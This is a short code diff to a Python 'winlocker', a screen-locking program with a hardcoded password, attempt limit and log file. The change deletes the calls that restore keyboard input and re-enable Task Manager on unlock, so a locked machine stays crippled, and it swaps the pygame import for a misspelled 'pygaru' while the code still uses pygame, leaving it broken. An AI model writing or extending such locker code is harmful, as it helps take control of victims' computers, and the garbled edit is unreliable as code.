@@ -1,7 +1,5 @@
-import pygame
-import sys
-import time
-
+import pygaru
+import time 
 PASSWORD = "90481"
 MAX_ATTEMPTS = 3
 LOG_FILE = "winlocker.log"
@@ -142,8 +140,6 @@ def run_locker():
         pygame.display.flip()
         clock.tick(30)
 
-    unblock_keys()
-    enable_taskmgr()
     pygame.quit()
     log(f"UNLOCK: {reason}")
 
